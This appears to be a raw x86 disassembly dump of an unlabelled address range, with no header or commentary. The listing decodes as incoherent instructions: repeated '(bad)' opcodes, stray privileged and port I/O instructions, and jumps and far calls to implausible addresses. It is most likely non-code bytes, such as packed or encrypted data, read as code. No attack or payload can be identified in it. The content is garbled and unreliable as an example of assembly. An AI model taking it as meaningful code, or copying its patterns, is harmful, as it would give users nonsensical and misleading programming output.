  6a3080:	inc    esi
  6a3081:	xchg   ebx,eax
  6a3082:	or     al,0x5d
  6a3084:	retf   0xf664
  6a3087:	(bad)  
  6a3089:	or     eax,0xce952733
  6a308e:	addr16 icebp 
  6a3090:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a3091:	push   ss
  6a3092:	pop    esi
  6a3093:	gs aas 
  6a3095:	mov    ecx,0x2efd47d6
  6a309a:	mov    edx,DWORD PTR [esi-0x24]
  6a309d:	mov    ah,0x8b
  6a309f:	mov    ebp,DWORD PTR [eax]
  6a30a1:	shl    DWORD PTR [esi+0x289e9d68],cl
  6a30a7:	jbe    0x6a3029
  6a30a9:	xchg   edx,eax
  6a30aa:	sub    eax,0xf8be648e
  6a30af:	fs push ebp
  6a30b1:	xchg   edi,eax
  6a30b2:	jecxz  0x6a3127
  6a30b4:	pop    es
  6a30b5:	es mov esi,0x290c373e
  6a30bb:	ret    0x10bf
  6a30be:	jno    0x6a30bc
  6a30c0:	inc    ecx
  6a30c1:	push   ds
  6a30c2:	push   0x5a7124c
  6a30c7:	(bad)  
  6a30c8:	mov    esp,0x889a59fa
  6a30cd:	add    eax,0x4a9fbe74
  6a30d2:	add    eax,0xf77e184e
  6a30d7:	lods   eax,DWORD PTR ds:[esi]
  6a30d8:	cmp    al,0x5f
  6a30da:	fild   QWORD PTR [ebx]
  6a30dc:	repz neg BYTE PTR [esi+0x609d69b2]
  6a30e3:	xchg   edx,eax
  6a30e4:	inc    edi
  6a30e5:	jl     0x6a30fd
  6a30e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a30e8:	arpl   WORD PTR [ebp-0x14],dx
  6a30eb:	int    0x2a
  6a30ed:	out    0x78,eax
  6a30ef:	and    eax,0xdd2cee2c
  6a30f4:	mul    DWORD PTR [esi+edi*4-0x47]
  6a30f8:	in     eax,dx
  6a30f9:	sbb    DWORD PTR [edx+0x7ce188ac],esi
  6a30ff:	imul   BYTE PTR [edx]
  6a3101:	lods   eax,DWORD PTR ds:[esi]
  6a3102:	add    eax,0x5b9c827
  6a3107:	ins    DWORD PTR es:[edi],dx
  6a3108:	jmp    0x6a3185
  6a310a:	call   0xe035f11c
  6a310f:	xchg   esp,eax
  6a3110:	inc    edi
  6a3111:	(bad)  [eax-0x7bd902f7]
  6a3117:	mov    ch,bh
  6a3119:	popf   
  6a311a:	xlat   BYTE PTR ds:[ebx]
  6a311b:	inc    esp
  6a311c:	cdq    
  6a311d:	daa    
  6a311e:	cmp    DWORD PTR [ebx+0x1614c639],ebp
  6a3124:	sbb    esp,DWORD PTR [eax+esi*1-0x46bfccf3]
  6a312b:	shr    BYTE PTR [esi+eiz*8-0x1af2a35f],cl
  6a3132:	cwde   
  6a3133:	sub    al,BYTE PTR [ebp+0x7d]
  6a3136:	mov    esp,0xfd64b3b5
  6a313b:	rcr    DWORD PTR [eax],cl
  6a313d:	add    BYTE PTR [eax],bl
  6a313f:	mov    eax,0x7d2d14ff
  6a3144:	jp     0x6a30ff
  6a3146:	lock and BYTE PTR [edi+0x7fd0fd0b],dl
  6a314d:	mov    WORD PTR [ecx-0x89cf7f4],?
  6a3153:	lds    ebx,FWORD PTR [eax+0x1735d050]
  6a3159:	daa    
  6a315a:	jg     0x6a30e8
  6a315c:	xlat   BYTE PTR ds:[ebx]
  6a315d:	jno    0x6a3117
  6a315f:	scas   eax,DWORD PTR es:[edi]
  6a3160:	stos   BYTE PTR es:[edi],al
  6a3161:	jo     0x6a30f7
  6a3163:	pop    esi
  6a3164:	jge    0x6a31da
  6a3166:	dec    ebx
  6a3167:	jnp    0x6a312b
  6a3169:	or     esp,DWORD PTR [esi+edi*1-0x172bd38b]
  6a3170:	adc    esp,DWORD PTR [edx-0x9]
  6a3173:	mov    ebx,ss
  6a3175:	mov    DWORD PTR [edx-0x63],esi
  6a3178:	and    ch,dl
  6a317a:	mov    dl,BYTE PTR [edi+0x6dc2367a]
  6a3180:	gs std 
  6a3182:	loopne 0x6a314a
  6a3184:	inc    ecx
  6a3185:	inc    edx
  6a3186:	ins    DWORD PTR es:[edi],dx
  6a3187:	nop
  6a3188:	or     BYTE PTR [ebp-0x5ba88a14],cl
  6a318e:	cli    
  6a318f:	xchg   ecx,eax
  6a3190:	test   al,0xbd
  6a3192:	je     0x6a31f0
  6a3194:	es sub eax,0xbd68e571
  6a319a:	mov    ebp,fs
  6a319c:	mov    ds,WORD PTR [esp-0x7f]
  6a31a0:	cld    
  6a31a1:	cmp    BYTE PTR [eax],bl
  6a31a3:	dec    edi
  6a31a4:	pop    esi
  6a31a5:	test   DWORD PTR [edx+0x76],ecx
  6a31a8:	push   ds
  6a31a9:	fsubr  QWORD PTR [edx-0x2ff55598]
  6a31af:	popa   
  6a31b0:	pop    esi
  6a31b1:	(bad)  
  6a31b2:	js     0x6a3149
  6a31b4:	mov    eax,0xee5e9d8a
  6a31b9:	jb     0x6a31f4
  6a31bb:	mov    ecx,0x23c8d271
  6a31c0:	aam    0xc1
  6a31c2:	adc    esi,esp
  6a31c4:	sub    esp,DWORD PTR [ebx-0x5440432]
  6a31ca:	push   es
  6a31cb:	dec    edx
  6a31cc:	lods   eax,DWORD PTR ds:[esi]
  6a31cd:	push   ebp
  6a31ce:	or     eax,0xa8eb2614
  6a31d3:	int3   
  6a31d4:	and    DWORD PTR [edi],0x6238b233
  6a31da:	jge    0x6a316e
  6a31dc:	adc    BYTE PTR [eax-0x6a],dh
  6a31df:	inc    esp
  6a31e0:	and    bh,dh
  6a31e2:	iret   
  6a31e3:	mov    esi,0x2f15f776
  6a31e8:	inc    esp
  6a31e9:	add    cl,BYTE PTR [eax+edi*4]
  6a31ec:	addr16 ss inc ecx
  6a31ef:	push   esi
  6a31f0:	pop    DWORD PTR [ebx+0x4e]
  6a31f3:	outs   dx,BYTE PTR ds:[esi]
  6a31f4:	mov    ebx,0xc9ac6fce
  6a31f9:	pop    edx
  6a31fa:	xchg   edi,eax
  6a31fb:	imul   edx,DWORD PTR [ecx+0x55],0xbb9ec14f
  6a3202:	test   BYTE PTR [edi+0x1c60c61],dl
  6a3208:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a3209:	jbe    0x6a31a0
  6a320b:	pusha  
  6a320c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a320d:	jg     0x6a322b
  6a320f:	adc    ebp,esi
  6a3211:	xor    eax,0x8a5afe81
  6a3216:	push   0xffffffc8
  6a3218:	add    bl,dh
  6a321a:	mov    eax,0xb7e70833
  6a321f:	std    
  6a3220:	cmp    eax,0xf43b6626
  6a3225:	mov    ch,0x9f
  6a3227:	sbb    al,0xa1
  6a3229:	jbe    0x6a3294
  6a322b:	mov    bl,0x51
  6a322d:	cdq    
  6a322e:	adc    DWORD PTR [edi],0x15df2b51
  6a3234:	jmp    0x1b004de3
  6a3239:	inc    edx
  6a323a:	enter  0x798e,0xef
  6a323e:	or     eax,0x2f2526f7
  6a3243:	aaa    
  6a3244:	mov    ch,0x41
  6a3246:	addr16 js 0x6a325a
  6a3249:	mov    dh,0x66
  6a324b:	sub    BYTE PTR [edx+0x12a717],ch
  6a3251:	xor    DWORD PTR [ecx],ebx
  6a3253:	(bad)  
  6a3254:	repz pop es
  6a3256:	addr16 mov edx,0x7cc9f947
  6a325c:	mov    bl,0x21
  6a325e:	xchg   ecx,eax
  6a325f:	add    eax,0xb7ab75c3
  6a3264:	and    BYTE PTR [esi-0x15],0xb5
  6a3268:	sub    al,0x60
  6a326a:	mov    ch,0x75
  6a326c:	mov    eax,0xbf6ad70e
  6a3271:	and    al,0x29
  6a3273:	push   esp
  6a3274:	dec    esp
  6a3275:	(bad)  
  6a3276:	out    dx,al
  6a3277:	test   al,0xdf
  6a3279:	and    ebx,DWORD PTR [ebx-0x6d]
  6a327c:	dec    ebx
  6a327d:	xchg   ecx,eax
  6a327e:	push   esp
  6a327f:	inc    ecx
  6a3280:	dec    ebx
  6a3281:	sub    eax,0xd1bc4bb3
  6a3286:	pop    ecx
  6a3287:	ds fcmovne st,st(5)
  6a328a:	cwde   
  6a328b:	adc    DWORD PTR [edx],esi
  6a328d:	xchg   DWORD PTR [edi],ebp
  6a328f:	push   0x2e
  6a3291:	stos   DWORD PTR es:[edi],eax
  6a3292:	(bad)  
  6a3293:	je     0x6a32f3
  6a3295:	lods   al,BYTE PTR ds:[esi]
  6a3296:	sub    esp,0x42b7e615
  6a329c:	retf   
  6a329d:	add    DWORD PTR [eax],ebp
  6a329f:	fwait
  6a32a0:	call   0xb965:0x4b8bf048
  6a32a7:	lock inc edx
  6a32a9:	loopne 0x6a329e
  6a32ab:	(bad)  
  6a32ac:	loopne 0x6a32c2
  6a32ae:	sti    
  6a32af:	lea    edi,[edx+0x46]
  6a32b2:	pop    edi
  6a32b3:	aas    
  6a32b4:	sar    DWORD PTR [edi+0x9],cl
  6a32b7:	pop    ds
  6a32b8:	mov    BYTE PTR [ebx-0x4],bl
  6a32bb:	into   
  6a32bc:	or     BYTE PTR [ebp-0x4f6022a1],dl
  6a32c2:	ins    BYTE PTR es:[edi],dx
  6a32c3:	(bad)  
  6a32c4:	jle    0x6a3314
  6a32c6:	imul   eax,ecx,0xffffffa0
  6a32c9:	pop    esp
  6a32ca:	sti    
  6a32cb:	gs pop ds
  6a32cd:	push   0xf9e61839
  6a32d2:	jp     0x6a3330
  6a32d4:	sti    
  6a32d5:	cmp    al,0x21
  6a32d7:	jle    0x6a32e1
  6a32d9:	inc    esp
  6a32da:	or     eax,0x4498514f
  6a32df:	aam    0x71
  6a32e1:	(bad)  
  6a32e2:	jnp    0x6a3304
  6a32e4:	cmp    DWORD PTR [ecx+0x2187ad0d],edx
  6a32ea:	loopne 0x6a3320
  6a32ec:	popa   
  6a32ed:	das    
  6a32ee:	out    0x93,eax
  6a32f0:	stos   BYTE PTR es:[edi],al
  6a32f1:	pop    ss
  6a32f2:	pop    eax
  6a32f3:	gs pop eax
  6a32f5:	sbb    eax,0xe02cf6e9
  6a32fa:	dec    esi
  6a32fb:	adc    eax,0xbaa37eeb
  6a3300:	in     eax,0xde
  6a3302:	fisub  WORD PTR [edx]
  6a3304:	jnp    0x6a3376
  6a3306:	pop    edi
  6a3307:	mov    ebp,0x2dc73320
  6a330c:	xchg   ecx,eax
  6a330d:	and    ebx,DWORD PTR [esi]
  6a330f:	jae    0x6a332d
  6a3311:	xor    eax,0x8f3a60f2
  6a3316:	outs   dx,DWORD PTR ds:[esi]
  6a3317:	ins    DWORD PTR es:[edi],dx
  6a3318:	mov    ecx,0x64f67ead
  6a331d:	or     BYTE PTR [edx-0x363f57e2],0x6e
  6a3324:	iret   
  6a3325:	inc    edx
  6a3326:	out    0x60,eax
  6a3328:	jecxz  0x6a32c1
  6a332a:	adc    DWORD PTR [edi],ebx
  6a332c:	pushw  0x3a79
  6a3330:	pop    ds
  6a3331:	(bad)  
  6a3332:	sub    BYTE PTR [esi+0x71],ah
  6a3335:	adc    ecx,eax
  6a3337:	dec    esp
  6a3338:	outs   dx,DWORD PTR ds:[esi]
  6a3339:	les    edi,FWORD PTR [ebp+0x64]
  6a333c:	jmp    0xfc0ae84c
  6a3341:	loop   0x6a32f2
  6a3343:	push   es
  6a3344:	icebp  
  6a3345:	add    esp,edx
  6a3347:	push   ds
  6a3348:	call   0x6b766a9c
  6a334d:	mov    dl,0x30
  6a334f:	pushf  
  6a3350:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a3351:	cmp    edi,esi
  6a3353:	hlt    
  6a3354:	mov    ds:0x813a6c80,al
  6a3359:	mov    ecx,0x8013514e
  6a335e:	aam    0x7c
  6a3360:	push   cs
  6a3361:	out    0x54,eax
  6a3363:	jnp    0x6a33bb
  6a3365:	test   eax,esp
  6a3367:	ja     0x6a33dd
  6a3369:	into   
  6a336a:	and    ebp,eax
  6a336c:	clc    
  6a336d:	jno    0x6a3327
  6a336f:	repz pop ds
  6a3371:	sub    BYTE PTR [edi+0xc],ch
  6a3374:	ja     0x6a331c
  6a3376:	repnz push cs
  6a3378:	pop    eax
  6a3379:	sbb    eax,0x740f1bf6
  6a337e:	inc    edi
  6a337f:	xchg   esi,eax
  6a3380:	push   ebp
  6a3381:	mov    bh,0xf2
  6a3383:	sub    BYTE PTR [ecx+0x71],cl
  6a3386:	cwde   
  6a3387:	fs sub al,0x9c
  6a338a:	adc    al,0xa0
  6a338c:	std    
  6a338d:	pop    esi
  6a338e:	je     0x6a3404
  6a3390:	push   eax
  6a3391:	xchg   dh,cl
  6a3393:	stos   BYTE PTR es:[edi],al
  6a3394:	mov    eax,ds:0xabb6c47a
  6a3399:	lock lods eax,DWORD PTR ds:[esi]
  6a339b:	shl    ah,1
  6a339d:	mov    ds:0x96915808,al
  6a33a2:	cmp    BYTE PTR [eax],bl
  6a33a4:	lahf   
  6a33a5:	pushf  
  6a33a6:	mov    bh,0xa
  6a33a8:	stc    
  6a33a9:	fisttp WORD PTR [ebx+0x773e78f9]
  6a33af:	cmp    BYTE PTR [ebp-0x5c14f249],al
  6a33b5:	cwde   
  6a33b6:	loope  0x6a3364
  6a33b8:	inc    esp
  6a33b9:	add    WORD PTR [ecx+0x283e7778],si
  6a33c0:	addr16 loopne 0x6a342c
  6a33c3:	mov    al,ds:0xa59b7f0b
  6a33c8:	or     al,BYTE PTR [esi]
  6a33ca:	cmp    DWORD PTR [esi+0x5c],ebp
  6a33cd:	xor    dh,BYTE PTR [ecx+ebx*8+0x3]
  6a33d1:	fiadd  WORD PTR [edx]
  6a33d3:	adc    BYTE PTR [edi-0x33],0x84
  6a33d7:	pop    edx
  6a33d8:	ins    DWORD PTR es:[edi],dx
  6a33d9:	stos   DWORD PTR es:[edi],eax
  6a33da:	call   0x2e702181
  6a33df:	dec    edx
  6a33e0:	mov    dl,0xc1
  6a33e2:	fidiv  WORD PTR [ebp+ebp*1-0x199bf387]
  6a33e9:	mov    al,0x8c
  6a33eb:	aas    
  6a33ec:	into   
  6a33ed:	mov    dl,0x21
  6a33ef:	cmp    al,0x8a
  6a33f1:	retf   
  6a33f2:	rcl    bh,1
  6a33f4:	and    al,0xbf
  6a33f6:	xchg   esp,eax
  6a33f7:	dec    ecx
  6a33f8:	ins    BYTE PTR es:[edi],dx
  6a33f9:	xor    ah,BYTE PTR [edx-0x71]
  6a33fc:	xor    BYTE PTR [edx-0x58],al
  6a33ff:	daa    
  6a3400:	cwde   
  6a3401:	adc    BYTE PTR [edx-0x7e4e6fba],cl
  6a3407:	adc    eax,0xe02580ec
  6a340c:	loopne 0x6a3455
  6a340e:	push   ecx
  6a340f:	das    
  6a3410:	sbb    eax,0xcacbd20e
  6a3415:	nop
  6a3416:	jg     0x6a3405
  6a3418:	xchg   ebp,eax
  6a3419:	pop    edi
  6a341a:	retf   
  6a341b:	shr    DWORD PTR [ebx+0x4a],cl
  6a341e:	pop    ds
  6a341f:	popa   
  6a3420:	mov    esi,0xb751f55c
  6a3425:	mov    edx,0x332c8e13
  6a342a:	les    esi,FWORD PTR [esi]
  6a342c:	int3   
  6a342d:	sbb    dl,BYTE PTR [ecx+0x7421b49e]
  6a3433:	push   0x18
  6a3435:	ror    BYTE PTR [ebp+0x5defa3ba],1
  6a343b:	repnz mov ebx,0x5d8e9fd5
  6a3441:	daa    
  6a3442:	int3   
  6a3443:	add    eax,esp
  6a3445:	pop    ecx
  6a3446:	pushf  
  6a3447:	(bad)  
  6a3448:	mov    WORD PTR [edx],gs
  6a344a:	cmp    al,0x26
  6a344c:	imul   edx,DWORD PTR [ecx],0x65
  6a344f:	and    BYTE PTR [edx],bh
  6a3451:	xchg   esi,eax
  6a3452:	(bad)  
  6a3453:	lea    esp,[ebx-0x34]
  6a3456:	jae    0x6a33da
  6a3458:	scas   eax,DWORD PTR es:[edi]
  6a3459:	xchg   ecx,eax
  6a345a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a345b:	fcomp  DWORD PTR [edx+0x43353968]
  6a3461:	popa   
  6a3462:	int3   
  6a3463:	and    eax,0x1bb3968
  6a3468:	xchg   ebx,eax
  6a3469:	cli    
  6a346a:	push   esi
  6a346b:	cmc    
  6a346c:	out    dx,eax
  6a346d:	dec    ecx
  6a346e:	(bad)  
  6a346f:	jno    0x6a3402
  6a3471:	hlt    
  6a3472:	addr16 out 0x44,eax
  6a3475:	push   edx
  6a3476:	ficomp WORD PTR [edx+0x5a]
  6a3479:	xchg   ecx,eax
  6a347a:	mov    ebp,0xecf179be
  6a347f:	mov    BYTE PTR [eax+0x31d47504],dh
  6a3485:	arpl   dx,dx
  6a3487:	push   es
  6a3488:	and    bl,cl
  6a348a:	out    0x3a,eax
  6a348c:	and    DWORD PTR [eax+ecx*8+0x58],ebp
  6a3490:	int3   
  6a3491:	adc    DWORD PTR [eax],0xbff55d39
  6a3497:	jnp    0x6a34ed
  6a3499:	jo     0x6a3518
  6a349b:	arpl   WORD PTR [edx-0x71],bx
  6a349e:	and    ch,BYTE PTR [eax+0x55]
  6a34a1:	mov    ds:0x16b7f4dd,eax
  6a34a6:	inc    edi
  6a34a7:	shl    DWORD PTR [esi],0xf1
  6a34aa:	arpl   ax,bx
  6a34ac:	dec    eax
  6a34ad:	xchg   bh,bl
  6a34af:	dec    ebx
  6a34b0:	(bad)  
  6a34b1:	or     esp,DWORD PTR [edi]
  6a34b3:	dec    ebx
  6a34b4:	fwait
  6a34b5:	sbb    DWORD PTR [esi+0x6d873dfc],ebp
  6a34bb:	fldenv [esp+eax*4-0x3977b616]
  6a34c2:	retf   0x1e0c
  6a34c5:	push   0xf6a5da59
  6a34ca:	das    
  6a34cb:	pop    ebx
  6a34cc:	push   eax
  6a34cd:	mov    edi,esp
  6a34cf:	sub    eax,0x4980f30e
  6a34d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a34d5:	dec    edx
  6a34d6:	call   0xe60f:0xd9426f2a
  6a34dd:	(bad)  
  6a34de:	(bad)  
  6a34df:	repz cli 
  6a34e1:	stos   DWORD PTR es:[edi],eax
  6a34e2:	xor    al,0x46
  6a34e4:	jecxz  0x6a34ec
  6a34e6:	fiadd  WORD PTR [edi+edx*2-0x4b]
  6a34ea:	in     al,dx
  6a34eb:	mov    ebx,0xc05c63aa
  6a34f0:	pop    edi
  6a34f1:	imul   ebx,DWORD PTR [edx],0xa
  6a34f4:	ins    BYTE PTR es:[edi],dx
  6a34f5:	int    0x56
  6a34f7:	sbb    edx,DWORD PTR ds:0x8287a6e9
  6a34fd:	ja     0x6a3542
  6a34ff:	out    0x28,al
  6a3501:	dec    ebx
  6a3502:	jno    0x6a34a3
  6a3504:	leave  
  6a3505:	adc    esi,DWORD PTR [esi]
  6a3507:	xchg   ebp,eax
  6a3508:	sub    BYTE PTR [eax],0x55
  6a350b:	mov    al,ds:0xf4fb3540
  6a3510:	popa   
  6a3511:	push   0x54e08728
  6a3516:	repz dec ebp
  6a3518:	sbb    al,0x17
  6a351a:	push   0x1e
  6a351c:	in     al,dx
  6a351d:	and    DWORD PTR [eax+0xd],esp
  6a3520:	mov    dh,0x3b
  6a3522:	or     DWORD PTR [esi+0x63],esp
  6a3525:	scas   eax,DWORD PTR es:[edi]
  6a3526:	fldcw  WORD PTR [ebx]
  6a3528:	dec    edx
  6a3529:	mov    edx,0xb1ede6a1
  6a352e:	aad    0x69
  6a3530:	push   0x3ce2f5a0
  6a3535:	inc    edx
  6a3536:	mov    ebp,0x164a79ac
  6a353b:	xchg   esp,eax
  6a353c:	call   0x49110e31
  6a3541:	mov    ecx,0x2ea1ccc6
  6a3546:	mov    ds:0x84dea443,eax
  6a354b:	(bad)  
  6a354c:	pop    eax
  6a354d:	loop   0x6a354f
  6a354f:	scas   al,BYTE PTR es:[edi]
  6a3550:	xor    eax,0x5e682410
  6a3555:	enter  0x8611,0x3b
  6a3559:	jg     0x6a3562
  6a355b:	enter  0x2c9,0x9b
  6a355f:	gs js  0x6a35bf
  6a3562:	dec    ecx
  6a3563:	push   esp
  6a3564:	lahf   
  6a3565:	xor    BYTE PTR [edx],cl
  6a3567:	inc    edi
  6a3568:	cdq    
  6a3569:	push   esi
  6a356a:	and    DWORD PTR [ebx],esi
  6a356c:	cs (bad) 
  6a356e:	test   eax,0x1ac0b71f
  6a3573:	sbb    BYTE PTR [edx],al
  6a3575:	lock pop esi
  6a3577:	xchg   ecx,eax
  6a3578:	pop    edi
  6a3579:	enter  0xb0d5,0xb6
  6a357d:	cmp    ebx,edx
  6a357f:	aaa    
  6a3580:	test   al,0x34
  6a3582:	jl     0x6a3587
  6a3584:	aaa    
  6a3585:	outs   dx,BYTE PTR ds:[esi]
  6a3586:	mov    ah,0x87
  6a3588:	sbb    ebp,ecx
  6a358a:	xchg   edi,eax
  6a358b:	jp     0x6a3517
  6a358d:	mov    edi,0x1624301c
  6a3592:	pop    es
  6a3593:	jmp    0x355a:0x27b2c2d3
  6a359a:	in     al,dx
  6a359b:	lock cs or al,0xe2
  6a359f:	jns    0x6a35b2
  6a35a1:	xchg   ebx,eax
  6a35a2:	hlt    
  6a35a3:	pop    edi
  6a35a4:	shl    BYTE PTR [edi-0x6c],0xc
  6a35a8:	fcmovnbe st,st(1)
  6a35aa:	mov    bl,0x7e
  6a35ac:	out    dx,eax
  6a35ad:	sub    ch,ch
  6a35af:	shl    ax,0x73
  6a35b3:	jg     0x6a3554
  6a35b5:	call   0x77f36623
  6a35ba:	mov    ds:0x8f36fd9c,eax
  6a35bf:	dec    esp
  6a35c0:	and    eax,0xca72b053
  6a35c5:	jnp    0x6a3595
  6a35c7:	shl    DWORD PTR [eax+0x6af36fb2],cl
  6a35cd:	xchg   edi,eax
  6a35ce:	stc    
  6a35cf:	test   eax,0xf9f56a55
  6a35d4:	clc    
  6a35d5:	pop    esi
  6a35d6:	and    dl,BYTE PTR [ebx]
  6a35d8:	es xchg edx,eax
  6a35da:	bound  ebx,QWORD PTR [ecx-0x6a]
  6a35dd:	and    eax,ecx
  6a35df:	aad    0x1a
  6a35e1:	inc    esi
  6a35e2:	call   0xb5b1:0x5ef1a8ec
  6a35e9:	and    eax,0x2ef2a913
  6a35ee:	ret    
  6a35ef:	mov    dh,0x99
  6a35f1:	xchg   BYTE PTR [ecx+0x3d7abac3],cl
  6a35f7:	dec    ecx
  6a35f8:	icebp  
  6a35f9:	and    DWORD PTR [ecx-0x2f],esi
  6a35fc:	pop    eax
  6a35fd:	das    
  6a35fe:	jne    0x6a3638
  6a3600:	pop    edi
  6a3601:	out    dx,eax
  6a3602:	cmc    
  6a3603:	or     al,0xd8
  6a3605:	inc    ebp
  6a3606:	mov    edi,0x769b8562
  6a360b:	mov    bh,0xb5
  6a360d:	mov    ch,0xd5
  6a360f:	jo     0x6a35e8
  6a3611:	mov    BYTE PTR fs:[edi-0x5d],bh
  6a3615:	out    dx,eax
  6a3616:	mov    dl,0x1f
  6a3618:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a3619:	in     al,dx
  6a361a:	pop    edx
  6a361b:	call   0x9fe0:0xcdcc9b91
  6a3622:	(bad)  
  6a3623:	aad    0xb6
  6a3625:	dec    edx
  6a3626:	cmp    al,0x95
  6a3628:	sti    
  6a3629:	cdq    
  6a362a:	mov    ebp,0xdca7afba
  6a362f:	push   cs
  6a3630:	mov    ebp,0x1ec66bd5
  6a3635:	xchg   ebp,eax
  6a3636:	rcl    BYTE PTR [ebp-0x10],1
  6a3639:	or     bl,BYTE PTR [edi+ecx*2]
  6a363c:	rcr    BYTE PTR [ebp-0x5326b11],0xc4
  6a3643:	cmp    BYTE PTR [eax+0x12],bl
  6a3646:	fst    QWORD PTR [edi-0x23]
  6a3649:	jb     0x6a3627
  6a364b:	sbb    BYTE PTR [ecx],dl
  6a364d:	shr    BYTE PTR [edx+edx*8],1
  6a3650:	imul   ecx,DWORD PTR [ecx-0xd1d0634],0xffffffda
  6a3657:	lea    ecx,[ebp-0x36]
  6a365a:	sbb    edi,DWORD PTR [ecx-0x1a]
  6a365d:	inc    esi
  6a365e:	inc    edi
  6a365f:	mov    edi,0xbb573f4b
  6a3664:	scas   eax,DWORD PTR es:[edi]
  6a3665:	stos   DWORD PTR es:[edi],eax
  6a3666:	mov    esp,0x51bfb902
  6a366b:	cmp    eax,0xea7327c0
  6a3670:	dec    eax
  6a3671:	pushf  
  6a3672:	dec    esi
  6a3673:	pop    ss
  6a3674:	mov    dh,0x58
  6a3676:	dec    esi
  6a3677:	je     0x6a36a0
  6a3679:	dec    edi
  6a367a:	test   eax,0x67e56707
  6a367f:	scas   eax,DWORD PTR es:[edi]
  6a3680:	sbb    al,0x91
  6a3682:	push   eax
  6a3683:	adc    eax,0xe0b9ba8c
  6a3688:	lahf   
  6a3689:	push   edi
  6a368a:	(bad)  
  6a368b:	nop
  6a368c:	and    eax,0x3ed8a15a
  6a3691:	(bad)  
  6a3693:	fidiv  WORD PTR [ebp+0x33951be0]
  6a3699:	cmp    DWORD PTR fs:[ebp-0x3f],eax
  6a369d:	add    ebp,DWORD PTR ds:0x6437d41c
  6a36a3:	xchg   esp,eax
  6a36a4:	mov    BYTE PTR [esi+edi*8+0x7c631583],bl
  6a36ab:	loope  0x6a36e6
  6a36ad:	scas   al,BYTE PTR es:[edi]
  6a36ae:	lods   al,BYTE PTR ds:[esi]
  6a36af:	pop    ebp
  6a36b0:	enter  0xf7ee,0xcc
  6a36b4:	call   0xeba3732c
  6a36b9:	dec    edi
  6a36ba:	jne    0x6a36ee
  6a36bc:	adc    eax,0x71742b04
  6a36c1:	mov    ah,0x7b
  6a36c3:	ds test al,0xf1
  6a36c6:	lock and eax,0xb62135b4
  6a36cc:	mov    eax,0xef62ca6f
  6a36d1:	out    0x72,al
  6a36d3:	cli    
  6a36d4:	int3   
  6a36d5:	mov    dh,dh
  6a36d7:	mov    al,ds:0xacd7610f
  6a36dc:	inc    esi
  6a36dd:	sahf   
  6a36de:	xchg   edi,eax
  6a36df:	rol    dh,1
  6a36e1:	push   ss
  6a36e2:	adc    bh,BYTE PTR [esi-0x2c3a1ed0]
  6a36e8:	popf   
  6a36e9:	(bad)  
  6a36ea:	retf   
  6a36eb:	inc    eax
  6a36ec:	sahf   
  6a36ed:	jmp    0x6a3748
  6a36ef:	adc    esp,DWORD PTR [esi-0x6c]
  6a36f2:	rcr    BYTE PTR ds:0x6b16fddf,1
  6a36f8:	and    eax,0x4aad1f88
  6a36fd:	xchg   ebp,eax
  6a36fe:	dec    ebp
  6a36ff:	in     eax,0x5b
  6a3701:	hlt    
  6a3702:	sbb    DWORD PTR [ebx-0x33],0x67
  6a3706:	adc    eax,0x309762d1
  6a370b:	adc    ebp,DWORD PTR [esi-0x1a]
  6a370e:	fistp  QWORD PTR [ecx+esi*4]
  6a3711:	ret    
  6a3712:	aad    0xb0
  6a3714:	sbb    DWORD PTR [ecx-0x80],ecx
  6a3717:	out    0x1,eax
  6a3719:	push   edi
  6a371a:	clc    
  6a371b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a371c:	icebp  
  6a371d:	neg    esp
  6a371f:	xchg   ecx,eax
  6a3720:	mov    al,ds:0x31319bd2
  6a3725:	or     BYTE PTR [ecx+0x62],al
  6a3728:	add    BYTE PTR [ecx],ch
  6a372a:	call   0x43008373
  6a372f:	cld    
  6a3730:	fnstcw WORD PTR [esi-0x15086865]
  6a3736:	mov    esp,0x11de38b
  6a373b:	popa   
  6a373c:	and    al,0x27
  6a373e:	aam    0xd9
  6a3740:	sub    dl,al
  6a3742:	xor    ebx,edx
  6a3744:	xchg   esp,eax
  6a3745:	mov    dh,dh
  6a3747:	add    DWORD PTR [ecx],0x1a
  6a374a:	and    DWORD PTR [edi],edi
  6a374c:	stos   DWORD PTR es:[edi],eax
  6a374d:	sub    al,0xc0
  6a374f:	mov    dh,0x1
  6a3751:	stos   BYTE PTR es:[edi],al
  6a3752:	in     al,dx
  6a3753:	or     BYTE PTR [eax-0x420c76f0],cl
  6a3759:	in     al,dx
  6a375a:	or     eax,0xacc51dae
  6a375f:	push   0x63d19d
  6a3764:	in     al,0xd9
  6a3766:	pop    edi
  6a3767:	or     DWORD PTR [ebx+0x78d4194e],esi
  6a376d:	shr    ch,0xdd
  6a3770:	push   cs
  6a3771:	jge    0x6a372a
  6a3773:	sbb    al,0x58
  6a3775:	mov    ebx,0x377ffa7b
  6a377a:	fs lahf 
  6a377c:	inc    ecx
  6a377d:	mov    ah,0x98
  6a377f:	loopne 0x6a37a4
  6a3781:	fdivr  st(7),st
  6a3783:	mov    al,ds:0x4f9151cb
  6a3788:	scas   al,BYTE PTR es:[edi]
  6a3789:	bound  ebp,QWORD PTR [edi]
  6a378b:	test   eax,0x28b4225
  6a3790:	sar    DWORD PTR [esi],1
  6a3792:	imul   edx,DWORD PTR [ebp+0x6d2e9d64],0x5c
  6a3799:	cmp    al,dl
  6a379b:	inc    edx
  6a379c:	cmp    eax,edi
  6a379e:	adc    bl,BYTE PTR [edi+0x69]
  6a37a1:	pop    esp
  6a37a2:	call   0xd8280e31
  6a37a7:	sub    eax,0x9c77a8b9
  6a37ac:	scas   al,BYTE PTR es:[edi]
  6a37ad:	xor    DWORD PTR [ecx+0x2c],ecx
  6a37b0:	adc    eax,0x36ded58b
  6a37b5:	push   eax
  6a37b6:	dec    edx
  6a37b7:	sbb    dl,BYTE PTR [ecx]
  6a37b9:	imul   esi,DWORD PTR [esp+esi*8],0xffffff9c
  6a37bd:	cmp    ch,cl
  6a37bf:	cmp    BYTE PTR [ebx+0x67],dl
  6a37c2:	sti    
  6a37c3:	scas   eax,DWORD PTR es:[edi]
  6a37c4:	in     eax,dx
  6a37c5:	out    dx,al
  6a37c6:	push   cs
